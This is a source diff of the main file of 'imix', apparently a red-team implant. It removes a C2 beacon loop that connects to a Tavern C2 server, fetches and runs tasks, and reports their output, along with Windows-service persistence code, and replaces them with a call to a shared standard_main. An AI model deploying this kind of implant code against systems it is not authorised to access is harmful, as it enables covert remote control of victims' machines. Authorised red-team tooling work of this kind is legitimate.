+++ implants/imix/src/main.rs
@@ -1,271 +1,40 @@
+#[cfg(win_service)]
 #[macro_use]
 extern crate windows_service;
 
 use anyhow::Result;
-use c2::pb::c2_client::C2Client;
-use c2::pb::TaskOutput;
-use clap::{arg, Command};
-use imix::exec::AsyncTask;
-use imix::init::agent_init;
-use imix::tasks::{start_new_tasks, submit_task_output};
-use imix::{tasks, Config, TaskID};
-use std::collections::HashMap;
-use std::ffi::OsString;
-use std::time::Instant;
+use imix::standard_main;
+
+#[cfg(win_service)]
 use windows_service::service_dispatcher;
 
-fn get_callback_uri(imix_config: Config) -> Result<String> {
-    Ok(imix_config.callback_config.c2_configs[0].uri.clone())
-}
+#[cfg(win_service)]
+use imix::win_service::service_main;
 
-// Async handler for port scanning.
-async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<()> {
-    #[cfg(debug_assertions)]
-    let mut debug_loop_count: i32 = 0;
+#[cfg(win_service)]
+define_windows_service!(ffi_service_main, service_main);
 
-    // This hashmap tracks all tasks by their ID (key) and a tuple value: (future, channel_reciever)
-    // AKA Work queue
-    let mut all_exec_futures: HashMap<TaskID, AsyncTask> = HashMap::new();
-    // This hashmap tracks all tasks output
-    // AKA Results queue
-    let mut all_task_res_map: HashMap<TaskID, Vec<TaskOutput>> = HashMap::new();
-
-    let host_id_file = if cfg!(target_os = "windows") {
-        "C:\\ProgramData\\system-id"
-    } else {
-        "/etc/system-id"
-    }
-    .to_string();
-
-    let (agent_properties, imix_config) = agent_init(config_path, host_id_file)?;
-
-    loop {
-        // @TODO: Why two timers?
-
-        // 0. Get loop start time
-        let loop_start_time = Instant::now();
-
-        #[cfg(debug_assertions)]
-        eprintln!("Get new tasks");
-
-        // 1. Pull down new tasks
-        // 1a) calculate callback uri
-        let cur_callback_uri = get_callback_uri(imix_config.clone())?;
-
-        // 1b) Setup the tavern client
-        let tavern_client = match C2Client::connect(cur_callback_uri.clone()).await {
-            Ok(tavern_client_local) => tavern_client_local,
-            Err(err) => {
-                #[cfg(debug_assertions)]
-                eprintln!("failed to create tavern client {}", err);
-                continue;
-            }
-        };
-
-        // 1c) Collect new tasks
-        #[cfg(debug_assertions)]
-        eprintln!(
-            "[{}]: collecting tasks",
-            (Instant::now() - loop_start_time).as_millis()
-        );
-
-        let new_tasks = tasks::get_new_tasks(
-            agent_properties.clone(),
-            imix_config.clone(),
-            tavern_client.clone(),
-        )
-        .await?;
-
-        // 2. Start new tasks
-        #[cfg(debug_assertions)]
-        eprintln!(
-            "[{}]: Starting {} new tasks",
-            (Instant::now() - loop_start_time).as_millis(),
-            new_tasks.len()
-        );
-
-        start_new_tasks(new_tasks, &mut all_exec_futures, loop_start_time).await?;
-
-        // 3. Sleep till callback time
-        let time_to_sleep = imix_config
-            .clone()
-            .callback_config
-            .interval
-            .checked_sub(loop_start_time.elapsed().as_secs())
-            .unwrap_or_else(|| 0);
-
-        #[cfg(debug_assertions)]
-        eprintln!(
-            "[{}]: Sleeping seconds {}",
-            (Instant::now() - loop_start_time).as_millis(),
-            time_to_sleep
-        );
-
-        std::thread::sleep(std::time::Duration::new(time_to_sleep as u64, 24601)); // This just sleeps our thread.
-
-        // Check status & send response
-        #[cfg(debug_assertions)]
-        eprintln!(
-            "[{}]: Checking task status",
-            (Instant::now() - loop_start_time).as_millis()
-        );
-
-        // Update running tasks and results
-        submit_task_output(
-            loop_start_time,
-            tavern_client,
-            &mut all_exec_futures,
-            &mut all_task_res_map,
-        )
-        .await?;
-
-        // Debug loop tracker
-        #[cfg(debug_assertions)]
-        if let Some(count_max) = loop_count_max {
-            debug_loop_count += 1;
-            if debug_loop_count >= count_max {
-                return Ok(());
-            }
-        }
-    }
-}
-
-#[cfg(not(win_service))]
-define_windows_service!(ffi_service_main, my_service_main);
-
-#[cfg(not(win_service))]
-fn run_service(arguments: Vec<OsString>) -> windows_service::Result<()> {
-    use std::time::Duration;
-
-    use windows_service::{service::{ServiceControl, ServiceStatus, ServiceType, ServiceState, ServiceControlAccept, ServiceExitCode}, service_control_handler::{ServiceControlHandlerResult, self}};
-
-    let event_handler = move |control_event| -> ServiceControlHandlerResult {
-        match control_event {
-            ServiceControl::Stop | ServiceControl::Interrogate => {
-                ServiceControlHandlerResult::NoError
-            }
-            _ => ServiceControlHandlerResult::NotImplemented,
-        }
-    };
-
-    // Register system service event handler
-    let status_handle = service_control_handler::register("my_service_name", event_handler)?;
-
-    let next_status = ServiceStatus {
-        // Should match the one from system service registry
-        service_type: ServiceType::OWN_PROCESS,
-        // The new state
-        current_state: ServiceState::Running,
-        // Accept stop events when running
-        controls_accepted: ServiceControlAccept::STOP,
-        // Used to report an error when starting or stopping only, otherwise must be zero
-        exit_code: ServiceExitCode::Win32(0),
-        // Only used for pending states, otherwise must be zero
-        checkpoint: 0,
-        // Only used for pending states, otherwise must be zero
-        wait_hint: Duration::default(),
-        process_id: None,
-    };
-
-    // Tell the system that the service is running now
-    status_handle.set_service_status(next_status)?;
-
-    // Do some work
-
-    Ok(())
-}
-
-#[cfg(not(win_service))]
-fn my_service_main(arguments: Vec<OsString>) {
-    // The entry point where execution will start on a background thread after a call to
-    // `service_dispatcher::start` from `main`.
-    match run_service(arguments.clone()) {
-        Ok(local_ok) => {},
+pub fn main() -> Result<(), imix::Error> {
+    #[cfg(win_service)]
+    match service_dispatcher::start("myservice", ffi_service_main) {
+        Ok(_) => {}
         Err(local_err) => {
             #[cfg(debug_assertions)]
-            eprintln!("Failed to start service: {}", local_err.to_string());
-        },
-    }
-
-    let runtime = tokio::runtime::Builder::new_multi_thread()
-        .worker_threads(128)
-        .enable_all()
-        .build()
-        .unwrap();
-
-    let cmd = Command::new("imix").arg(
-        arg!(
-            -c --config <FILE> "Sets a custom config file"
-        )
-        .required(false),
-    );
-
-    if let Ok(matches) = cmd.try_get_matches_from(arguments) {
-        if let Some(config_path) = matches.value_of("config") {
-            match runtime.block_on(main_loop(config_path.to_string(), None)) {
-                Ok(_) => {}
-                Err(error) => eprintln!(
-                    "Imix main_loop exited unexpectedly with config: {}\n{}",
-                    config_path.to_string(),
-                    error
-                ),
-            }
+            eprintln!(
+                "Failed to start imix as a service: {}",
+                local_err.to_string()
+            );
         }
     }
 
-    return;
-}
-// #[cfg(all(target_os = "windows", win_service))]
-#[cfg(not(win_service))]
-fn main() -> Result<(), windows_service::Error> {
-    service_dispatcher::start("myservice", ffi_service_main)?;
-    Ok(())
-}
-
-// #[cfg(not(win_service))]
-#[cfg(win_service)]
-pub fn main() -> Result<(), imix::Error> {
-    let matches = Command::new("imix")
-        .arg(
-            arg!(
-                -c --config <FILE> "Sets a custom config file"
-            )
-            .required(false),
-        )
-        .subcommand(
-            Command::new("install").about("Run in install mode").arg(
-                arg!(
-                    -c --config <FILE> "Sets a custom config file"
-                )
-                .required(true),
-            ),
-        )
-        .get_matches();
-
-    match matches.subcommand() {
-        Some(("install", args)) => {
-            let _config_path = args.value_of("config").unwrap();
-            unimplemented!("Install isn't implemented yet")
-        }
-        _ => {}
-    }
-
-    let runtime = tokio::runtime::Builder::new_multi_thread()
-        .worker_threads(128)
-        .enable_all()
-        .build()
-        .unwrap();
-
-    if let Some(config_path) = matches.value_of("config") {
-        match runtime.block_on(main_loop(config_path.to_string(), None)) {
-            Ok(_) => {}
-            Err(error) => eprintln!(
-                "Imix main_loop exited unexpectedly with config: {}\n{}",
-                config_path.to_string(),
-                error
-            ),
+    match standard_main(None) {
+        Ok(_) => {}
+        Err(local_err) => {
+            #[cfg(debug_assertions)]
+            eprintln!("Failde to start imix: {}", local_err);
         }
     }
+
     Ok(())
 }
